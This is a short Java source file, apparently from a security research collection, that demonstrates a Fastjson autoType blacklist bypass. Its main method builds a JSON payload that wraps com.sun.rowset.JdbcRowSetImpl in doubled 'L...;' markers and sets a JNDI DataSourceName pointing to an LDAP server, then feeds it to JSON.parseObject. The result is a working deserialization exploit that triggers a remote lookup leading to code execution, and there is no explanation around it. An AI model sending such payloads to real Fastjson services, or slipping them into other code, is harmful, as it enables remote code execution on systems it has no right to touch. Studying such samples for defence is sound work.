/*
 * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastjsonBypassL {
    public static void main(String[] args){
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String s="{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"DataSourceName\":\"ldap://127.0.0.1:8085/ZGBWoLkn\",\"AutoCommit\":1}";
        JSON.parseObject(s);
    }
}